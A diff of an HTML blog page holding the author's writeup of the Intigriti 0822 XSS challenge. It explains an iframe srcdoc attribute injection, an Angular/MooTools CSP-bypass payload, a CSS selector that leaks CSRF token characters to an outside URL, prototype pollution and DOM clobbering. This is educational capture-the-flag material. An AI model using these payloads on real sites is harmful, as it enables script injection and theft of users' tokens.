@@ -28,12 +28,12 @@
 
 
 
-    <meta name="description" content="In Auguest, I and bruno made a XSS challenge on Intigriti. When we decided to make it, we hope it’s a difficult and fun challenge, and the players can also learn a lot from it. Here is the writeup fo">
+    <meta name="description" content="In Auguest, I and bruno made a XSS challenge on Intigriti. When we decided to make it, we hope it’s a difficult and fun challenge, and the players can also learn a lot from it. Here is the writeup f">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Intigriti 0822 XSS Challenge Author Writeup">
 <meta property="og:url" content="https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/index.html">
 <meta property="og:site_name" content="Huli&#39;s blog">
-<meta property="og:description" content="In Auguest, I and bruno made a XSS challenge on Intigriti. When we decided to make it, we hope it’s a difficult and fun challenge, and the players can also learn a lot from it. Here is the writeup fo">
+<meta property="og:description" content="In Auguest, I and bruno made a XSS challenge on Intigriti. When we decided to make it, we hope it’s a difficult and fun challenge, and the players can also learn a lot from it. Here is the writeup f">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://blog.huli.tw/img/intigriti-0822-xss-author-writeup/cover-en.png">
 <meta property="article:published_time" content="2022-08-28T22:43:37.000Z">
@@ -270,12 +270,13 @@
     <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
         <img src="/img/intigriti-0822-xss-author-writeup/cover-en.png" style="display:none">
+
 <p>In Auguest, I and bruno made a XSS challenge on Intigriti. When we decided to make it, we hope it’s a difficult and fun challenge, and the players can also learn a lot from it.</p>
 <p>Here is the writeup for this challenge.</p>
 <span id="more"></span>
-<h2><span id="about-the-challenge">About the challenge</span></h2>
-<p><a target="_blank" rel="noopener" href="https://challenge-0822.intigriti.io/">https://challenge-0822.intigriti.io/</a></p>
-<p><img src="/img/intigriti-0822-xss-author-writeup/p1.png" alt></p>
+
+<h2><span id="about-the-challenge">About the challenge</span></h2><p><a target="_blank" rel="noopener" href="https://challenge-0822.intigriti.io/">https://challenge-0822.intigriti.io/</a></p>
+<p><img src="/img/intigriti-0822-xss-author-writeup/p1.png"></p>
 <p>The challenge is a business card generator with following features:</p>
 <ol>
 <li>Update theme</li>
@@ -283,39 +284,40 @@
 <li>Update name</li>
 </ol>
 <p>The goal of the challenge is to pop up an alert. User interaction is allowed in a very limited sense. For example, you give the admin a page, the admin will click the “CLICK ME” button on that page, that’s all.</p>
-<h2><span id="solution">Solution</span></h2>
-<p>Basically, there are two parts of the challenge:</p>
+<h2><span id="solution">Solution</span></h2><p>Basically, there are two parts of the challenge:</p>
 <ol>
 <li>CSRF</li>
 <li>bypass CSP to perform XSS</li>
 </ol>
 <p>The second part is easier to understand, so I will start from the second part.</p>
-<h3><span id="xss">XSS</span></h3>
-<p>In <code>preview.php</code>, there is a feature to replace the link to either iframe or image after sanitized:</p>
+<h3><span id="xss">XSS</span></h3><p>In <code>preview.php</code>, there is a feature to replace the link to either iframe or image after sanitized:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$desc</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$desc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token variable">$desc</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(https?:\/\/www\.youtube\.com\/embed\/[^\s]*)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;iframe src="$1">&lt;/iframe>'</span><span class="token punctuation">,</span> <span class="token variable">$desc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token variable">$desc</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(https?:\/\/[^\s]*\.(png|jpg|gif))/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;img src="$1">'</span><span class="token punctuation">,</span> <span class="token variable">$desc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>It looks fine at first glance, because we already sanitized the content, so you can’t escape from the double quote.</p>
 <p>But, if you think outside the box, you will found that it’s not true.</p>
 <p>What if a link gets transform to both iframe and img at the same time?</p>
 <p>Take <code>https://www.youtube.com/embed/abc.jpg</code> as an example, after first replacement, it become:</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.youtube.com/embed/abc.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>After the second replacement, the <code>src</code> part become</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.youtube.com/embed/abc.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>So the entire string is:</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;iframe src="<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.youtube.com/embed/abc.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>Because of this behavior, the double quote of the <code>src</code> attribute has been closed, which means we can inject a new attribute to iframe.</p>
-<p>For example, we can inject <code>srcdoc</code> using this link: <code>https://www.youtube.com/embed/srcdoc=&lt;h1&gt;hello&lt;/h1&gt;.jpg</code></p>
-<p><img src="/img/intigriti-0822-xss-author-writeup/p2.png" alt></p>
+<p>For example, we can inject <code>srcdoc</code> using this link: <code>https://www.youtube.com/embed/srcdoc=&lt;h1&gt;hello&lt;/h1&gt;.jpg</code> </p>
+<p><img src="/img/intigriti-0822-xss-author-writeup/p2.png"></p>
 <p>You may wondering why this works, how can it bypass the <code>htmlspecialchars</code>?</p>
 <p>No, it’s not. The content is still encoded, but the context is different.</p>
 <p>It’s the content of the attribute now. In HTML, the attribute content will be decoded.</p>
 <p>For now, we can inject any HTML we want via <code>&lt;iframe srcdoc&gt;</code>, but it’s not an XSS at the moment as we still need to bypass the CSP.</p>
-<h3><span id="csp-bypass">CSP Bypass</span></h3>
-<p>Here is the CSP:</p>
+<h3><span id="csp-bypass">CSP Bypass</span></h3><p>Here is the CSP:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
   <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Security-Policy: "</span><span class="token operator">.</span>
       <span class="token string double-quoted-string">"default-src 'self'; "</span> <span class="token operator">.</span>
@@ -327,9 +329,11 @@
       <span class="token string double-quoted-string">"frame-src https://www.youtube.com/;"</span><span class="token operator">.</span>
       <span class="token string double-quoted-string">"script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>It’s a classic CSP bypass which even appeared in the intigriti XSS challenge last month.</p>
 <p><code>https://cdnjs.cloudflare.com/ajax/libs</code> is allowed, so we can use the Angular gadget in the <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-(chrome)-shorter">XSS cheat sheet</a>:</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;input id=x ng-focus=$event.path|orderBy:'(z=alert)(1)'><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>Are we done? Nope, it’s not work because <code>focus</code> event is not triggered.</p>
 <p>The preivew content is hidden by default, the user needs to click the button to remove <code>display:none</code> CSS rule to make it visible. It’s a dead end since user interaction is not allowed here.</p>
 <p>When it comes to Angular CSP bypass, my favorite one is the following:</p>
@@ -338,6 +342,7 @@
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
   &#123;&#123;$on.curry.call().alert(1)&#125;&#125;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>User interaction is not needed, as well as <code>unsafe-inline</code> and <code>unsafe-eval</code>.</p>
 <p>I learned this payload from:</p>
 <ol>
@@ -353,6 +358,7 @@
     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><code>proto</code> is forbidden, also <code>#</code> and <code>&amp;</code>, so we can’t use HTML entities to bypass the detection.</p>
 <p>To solve this problem, the player is expected to find out that why <code>prototype.js</code> is needed for the bypass.</p>
 <p>It’s needed because prototype.js <a target="_blank" rel="noopener" href="https://github.com/prototypejs/prototype/blob/master/src/prototype/lang/function.js#L226">adds a few methods</a> to different prototype, like Function.prototype:</p>
@@ -364,6 +370,7 @@
     <span class="token keyword">return</span> <span class="token function">__method</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>The first argument of <code>Function.prototype.call</code> is <code>thisArg</code>, you can decide the value of <code>this</code> in the function. It’s worth noting that if you call this function without providing <code>thisArg</code>, the default value of <code>this</code> will be <code>window</code> in non-strict mode.</p>
 <p>Here is an example:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -373,10 +380,11 @@
 <span class="token function">test</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span> <span class="token comment">// 123</span>
 <span class="token function">test</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'str'</span><span class="token punctuation">)</span> <span class="token comment">// 'str'</span>
 <span class="token function">test</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// window</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>So, <code>any_function.curry.call()</code> will return <code>this</code> because of this line: <code>if (!arguments.length) return this</code>. And we call this function without providing <code>thisArg</code>, so <code>this</code> is <code>window</code> now. This behavior bypasses the Angular sandbox, that’s why we need <code>prototype.js</code>.</p>
 <p>If we can find a similar library that also pollutes the prototype and return <code>this</code>, we can replace <code>prototype.js</code>.</p>
 <p>How to find such library?</p>
-<p>Have you heard about <code>SmooshGate</code>?</p>
+<p>Have you heard about <code>SmooshGate</code>? </p>
 <p>If you don’t, you can read this great article: <a target="_blank" rel="noopener" href="https://developer.chrome.com/blog/smooshgate/">SmooshGate FAQ</a>.</p>
 <p>It’s a story about <code>Array.prototype.flat</code>, which should be named as <code>Array.prototype.flatten</code> at first.</p>
 <p>Why <code>Array.prototype.flatten</code> is abandoned? It’s because a library called <a target="_blank" rel="noopener" href="https://mootools.net/">MooTools</a> already used this name for quite a while. If the browsers implement <code>Array.prototype.flatten</code>, all websited that used MooTools will break.</p>
@@ -454,42 +462,46 @@
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>The result is:</p>
-<p><img src="/img/intigriti-0822-xss-author-writeup/p3.png" alt></p>
-<p>So, we can replace <code>prototype.js</code> with <code>MooTools</code>:</p>
+<p><img src="/img/intigriti-0822-xss-author-writeup/p3.png"></p>
+<p>So, we can replace <code>prototype.js</code> with <code>MooTools</code>: </p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
   &#123;&#123;[].empty.call().alert([].empty.call().document.domain)&#125;&#125;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>What if the players never heard about <code>SmoothGate</code>? They can use the similar approach in an automatic way.</p>
-<p><code>cdn.js</code> provides an <a target="_blank" rel="noopener" href="https://cdnjs.com/api#browse">API</a> to query all hosted libraries, the player can leverage this API and the script above to build a simple tool to find all gadgets on <code>cdn.js</code>.</p>
+<p><code>cdn.js</code> provides an <a target="_blank" rel="noopener" href="https://cdnjs.com/api#browse">API</a> to query all hosted libraries, the player can leverage this API and the script above to build a simple tool to find all gadgets on <code>cdn.js</code>. </p>
 <p>I will open source a project about this within a few days.</p>
 <p>Now we have an XSS, but it still need user interaction to submit the form.</p>
 <p>In order to avoid user interaction, we need CSRF. To perform CSRF, we need to steal CSRF token.</p>
-<h3><span id="steal-csrf-token">Steal CSRF token</span></h3>
-<p>Where is the CSRF token?</p>
+<h3><span id="steal-csrf-token">Steal CSRF token</span></h3><p>Where is the CSRF token?</p>
 <p>The CSRF token is in the <code>app.php</code> page, it appears twice:</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?= $csrf_token ?><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?= $csrf_token ?><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>There is another vulnerability in <code>app.php</code>:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nameField<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><code>$_SESSION['name']</code> is not encoded before printing, so we have a HTML injection here. But the problem is, there is another check for the length of the name:</p>
+
+<p><code>$_SESSION[&#39;name&#39;]</code> is not encoded before printing, so we have a HTML injection here. But the problem is, there is another check for the length of the name:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name too long'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>Given that the CSP is strict and the length is very limited, XSS is most likely impossible. It’s fine, because XSS is not the only way to steal something,  we can use CSS injection!</p>
 <p>This is a good article to learn what CSS injection is and various way to exploit: <a target="_blank" rel="noopener" href="https://web.archive.org/web/20240324012538/https://x-c3ll.github.io/posts/CSS-Injection-Primitives/">CSS Injection Primitives</a>.</p>
 <p>Usually, the blog post about stealing CSRF token is for <code>&lt;input&gt;</code>, but we have <code>&lt;input type=hidden&gt;</code> here, so it won’t work. if there is other sibling element, we can use sibling selector like this: <code>input[value^=a] div</code> to steal the token, but it’s also not working here because <code>&lt;input&gt;</code> is wrapped by a <code>&lt;div&gt;</code>.</p>
 <p>Then, how to leak the content? Since <code>&lt;input&gt;</code> won’t work, we can use <code>&lt;meta&gt;</code> tag!</p>
 <p><code>&lt;meta&gt;</code> is not displayed because browser adds a default <code>display:none</code> attribute, we can override it by explicitly declare <code>meta &#123; display:block; &#125;</code>. It’s not enough, because <code>&lt;meta&gt;</code> is under <code>&lt;head&gt;</code>, and <code>&lt;head&gt;</code> is also hidden by default, so we need <code>head, meta &#123; display:block; &#125;</code> to make it visible.</p>
 <p>You may wondering: “It should be useless to make it ‘visible’, because meta content is invisible by default, you can’t see the content on the screen!”</p>
-<p>It sounds fair, but surprisingly, the style for <code>&lt;meta&gt;</code> still apply even you can’t see the content.</p>
-<p><img src="/img/intigriti-0822-xss-author-writeup/p4.png" alt></p>
-<p>By the way, there is a selector called <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/:has">:has</a>, this will make this challenge much easier. But it’s enabled by default from Chrome 105 which is still in beta until the end of August(yep, two days after).</p>
+<p>It sounds fair, but surprisingly, the style for <code>&lt;meta&gt;</code> still apply even you can’t see the content. </p>
+<p><img src="/img/intigriti-0822-xss-author-writeup/p4.png"></p>
+<p>By the way, there is a selector called <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/:has">:has</a>, this will make this challenge much easier. But it’s enabled by default from Chrome 105 which is still in beta until the end of August(yep, two days after). </p>
 <p>If we can inject <code>&lt;style&gt;</code> tag, we can steal the first character of the CSRF token in the following way:</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
   <span class="token selector">head, meta[name=csrf-token]</span> <span class="token punctuation">&#123;</span>
@@ -504,6 +516,7 @@
     <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?char=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
 </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>We can steal all 32 characters by doing the same thing again and again. The implementation is a bit trivial, you can build your own or try to utilize some open-source projects on GitHub.</p>
 <p>When displaying a message, it calls <code>DOMPurify.sanitize</code> to filter out malicious content, but <code>&lt;style&gt;</code> is not consider harmful and it’s allowed by default in DOMPurify.</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">showMessage</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -520,6 +533,7 @@
     container<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>modal<span class="token punctuation">)</span>
   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token function">getTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>The problem is, our injected element will be removed after so called <code>timeout</code>, the default timeout is <code>Math.random()*300 + 300</code> as per following code:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">const</span> message <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'#msg='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
@@ -536,6 +550,7 @@
     <span class="token operator">...</span>options
   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>We can’t steal a 32-characters CSRF token in 600ms, unless we find a way to increase the timeout.</p>
 <p>Look at the following part carefully:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">testing</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -544,9 +559,9 @@
   options<span class="token punctuation">[</span><span class="token string">'production'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>
   options<span class="token punctuation">[</span><span class="token string">'timeout'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span> <span class="token operator">+</span> <span class="token number">300</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>If the condition(<code>document.domain.match(/testing/)</code>) is <code>false</code>, the <code>timeout</code> will be set and can’t be change. If we can let the condition be <code>true</code> and find a prototype pollution, we can pollute <code>Object.prototype.timeout</code> to manipulate the timeout.</p>
-<h3><span id="prototype-pollution">Prototype pollution</span></h3>
-<p>Regarding prototype pollution, people usually think it only appear when parsing query string or merge the object. In fact, the problem is about the pattern <code>obj[x][y]</code>, anywhere with such pattern can be vulnerable if you can control both <code>x</code> and <code>y</code></p>
+<h3><span id="prototype-pollution">Prototype pollution</span></h3><p>Regarding prototype pollution, people usually think it only appear when parsing query string or merge the object. In fact, the problem is about the pattern <code>obj[x][y]</code>, anywhere with such pattern can be vulnerable if you can control both <code>x</code> and <code>y</code></p>
 <p>It’s exactly the case for <code>initTheme</code>:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">initTheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>matchMedia <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span><span class="token function">matchMedia</span><span class="token punctuation">(</span><span class="token string">'(prefers-color-scheme: dark)'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -578,6 +593,7 @@
       <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
     <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>In the loop, it assign <code>theme[themeName]</code> to <code>currentTheme</code>.</p>
 <p>Then in another inner loop, a function is assigned to <code>currentTheme[item]</code>, which is actually <code>theme[themeName][item]</code>.</p>
 <p>We can pollute the prototype by providing a theme like this:</p>
@@ -588,15 +604,16 @@
     <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>After theme is loaded, <code>Object.prototype.timeout</code> became a function which always returns <code>&quot;99999&quot;</code>.</p>
 <p>We have made good progress by controlling the <code>timeout</code>, but how about the condition?</p>
 <p>How can we make <code>document.domain.match(/testing/)</code> true? Is that even possible?</p>
-<h3><span id="dom-clobbering-to-the-rescue">DOM clobbering to the rescue</span></h3>
-<p>The value of <code>document.domain</code> is what you thought, until DOM clobbering comes into play.</p>
+<h3><span id="dom-clobbering-to-the-rescue">DOM clobbering to the rescue</span></h3><p>The value of <code>document.domain</code> is what you thought, until DOM clobbering comes into play.</p>
 <p>Besides clobbering <code>window</code> properties, <code>document</code> properties can also be clobbered via <code>&lt;img&gt;</code>, <code>&lt;form&gt;</code>, <code>&lt;object&gt;</code> and <code>&lt;embed&gt;</code></p>
 <p>For example, if we have <code>&lt;img name=cookie&gt;</code>, the value of <code>document.cookie</code> will be the img element instead of a string.</p>
 <p>Remember that we have a HTML injection in 20 characters?</p>
